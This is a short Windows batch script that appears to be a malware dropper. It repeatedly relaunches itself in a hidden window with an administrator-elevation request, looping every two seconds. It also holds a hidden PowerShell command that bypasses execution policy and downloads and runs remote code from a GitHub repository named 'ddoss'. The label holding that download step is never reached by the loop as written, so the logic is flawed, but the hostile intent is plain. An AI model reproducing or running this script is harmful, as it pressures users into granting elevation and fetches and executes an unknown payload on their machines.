@echo off
:retry
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
timeout /t 2 /nobreak >nul
goto retry

:admin
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
exit
